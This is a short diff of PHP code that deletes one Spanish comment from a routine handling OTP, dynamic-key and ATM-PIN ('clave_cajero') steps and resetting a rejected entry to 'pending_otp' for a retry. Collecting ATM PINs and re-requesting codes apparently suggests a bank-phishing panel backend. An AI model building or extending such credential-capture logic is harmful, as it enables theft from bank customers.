@@ -95,7 +95,6 @@ if (in_array($tipoPaso, ['otp', 'clave_dinamica', 'clave_cajero'])) {
     $updates = [];
     $params = [];
 
-    // Si es reintento, limpiamos los códigos anteriores para que el nuevo OTP se guarde bien
     if ($esReintento && in_array($estadoActual, $estadosRechazados)) {
         $updates[] = "estado = 'pending_otp'";
         $updates[] = "otp_modo = 'otp'";
